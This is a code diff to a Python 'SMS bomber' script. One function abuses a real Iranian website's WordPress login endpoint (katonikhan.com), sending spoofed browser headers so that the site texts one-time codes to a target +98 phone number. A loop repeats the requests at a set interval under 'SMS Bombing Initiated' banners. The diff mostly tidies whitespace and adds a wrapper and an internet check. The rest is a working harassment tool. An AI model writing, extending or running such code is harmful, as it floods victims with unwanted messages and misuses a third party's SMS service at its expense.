@@ -13,14 +13,14 @@ except ImportError:
     os_system("python3 -m pip install requests")
 
 # Colors
-r = '\033[31;1m'  
-g = '\033[32;1m'  
-y = '\033[33;1m'  
-b = '\033[34;1m'  
-p = '\033[35;1m'  
-w = '\033[37;1m'  
-a = '\033[0m'     
-d = '\033[90;1m'  
+r = '\033[31;1m'
+g = '\033[32;1m'
+y = '\033[33;1m'
+b = '\033[34;1m'
+p = '\033[35;1m'
+w = '\033[37;1m'
+a = '\033[0m'
+d = '\033[90;1m'
 
 # System info
 Node, System, Release = node(), system(), release()
@@ -49,13 +49,10 @@ def check_internet():
 
 def katonikhan(phone):
     import requests
-    
     digits_phone = phone.replace("+98", "")
     formatted_phone = f"{digits_phone[:3]}+{digits_phone[3:6]}+{digits_phone[6:]}"
-    
     try:
         url = "https://katonikhan.com/wp-admin/admin-ajax.php"
-        
         payload = {
             "phone": formatted_phone,
             "digt_countrycode": "+98",
@@ -76,7 +73,6 @@ def katonikhan(phone):
             "container": "digits_protected",
             "sub_action": "sms_otp"
         }
-        
         headers = {
             "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1",
             "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
@@ -84,28 +80,38 @@ def katonikhan(phone):
             "Origin": "https://katonikhan.com",
             "Referer": "https://katonikhan.com/?login=true&page=1&redirect_to=https%3A%2F%2Fkatonikhan.com%2F",
         }
-        
         response = requests.post(url, data=payload, headers=headers, timeout=10)
-        
         if response.status_code == 200:
-            response_data = response.json()
-            if response_data.get("success") is True:
-                print(f'{g}(katonikhan) {a}Code Sent')
-                return True
-        
+            try:
+                response_data = response.json()
+                if response_data.get("success") is True:
+                    print(f'{g}(katonikhan) {a}Code Sent')
+                    return True
+            except:
+                pass
         return False
-            
     except Exception:
         return False
 
+# ------------------------------
+# Safe runner for services
+# ------------------------------
+def send_service_safe(service, phone):
+    try:
+        if service(phone):
+            print(f"{g}[+] {service.__name__} sent successfully!{a}")
+        else:
+            print(f"{r}[-] {service.__name__} failed!{a}")
+    except Exception as e:
+        print(f"{r}[-] Error in {service.__name__}: {e}{a}")
 
-   # Simple SMS bomber
+# ------------------------------
+# Simple SMS bomber
+# ------------------------------
 def Vip(phone, Time):
     services = [
         katonikhan,
     ]
-    
-    
     total_services = len(services)
 
     print_slow(f"{p}╔═════[ SMS Bombing Initiated ]═════╗")
@@ -122,7 +128,7 @@ def Vip(phone, Time):
                 sleep(Time)
     except KeyboardInterrupt:
         print_slow(f"{g}[+] {y}Mission Completed!")
-        os_system('clear' if name == 'posix' else 'cls')  
+        os_system('clear' if name == 'posix' else 'cls')
 
 # Phone validation
 def is_phone(phone: str):
@@ -154,7 +160,6 @@ def main_menu():
 def main():
     while True:
         choice = main_menu()
-
         if choice == '1':
             print_slow(f"{g}[+] {y}Starting SMS Bomber!")
             while True:
@@ -180,4 +185,7 @@ def main():
             sleep(1)
 
 if __name__ == "__main__":
-    main()
+    if not check_internet():
+        print(f"{r}[-] No internet connection detected!{a}")
+    else:
+        main()
